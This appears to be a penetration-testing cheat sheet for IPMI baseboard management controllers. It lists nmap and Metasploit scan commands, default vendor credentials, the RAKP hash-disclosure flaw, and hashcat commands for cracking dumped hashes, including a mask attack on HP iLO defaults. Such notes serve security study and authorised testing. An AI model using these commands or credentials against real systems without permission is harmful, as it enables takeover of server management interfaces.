
## 🔍 Overview & Footprinting
* **Protocol & Port**: IPMI communicates over **UDP port 623**. Target systems are known as Baseboard Management Controllers (BMCs).
* **Nmap Version Scan**: 
  `sudo nmap -sU --script ipmi-version -p 623 <target_ip>`
* **Metasploit Version Scan**: 
  * Module: `auxiliary/scanner/ipmi/ipmi_version`
  * Set target: `set rhosts <target_ip>`

---

## 🔑 Default Credentials Cheatsheet
| Product | Username | Password |
| :--- | :--- | :--- |
| **Dell iDRAC** | `root` | `calvin` |
| **HP iLO** | `Administrator` | Randomized 8-character string (numbers & uppercase letters) |
| **Supermicro IPMI** | `ADMIN` | `ADMIN` |

---

## ⚠️ Vulnerability & Hash Dumping (IPMI 2.0 RAKP)
* **The Flaw**: IPMI 2.0 authenticates by sending a salted SHA1 or MD5 password hash of any valid user account to the client, allowing attackers to capture and crack hashes offline.
* **Dumping Hashes with Metasploit**: 
  * Module: `auxiliary/scanner/ipmi/ipmi_dumphashes`
  * Set target: `set rhosts <target_ip>`
* **Cracking Hashes (Hashcat Mode 7300)**: 
  * General offline dictionary attack: `hashcat -m 7300 ipmi.txt -a 0 <wordlist>`
  * HP iLO Factory Default Mask Attack (8-char uppercase & numbers): `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`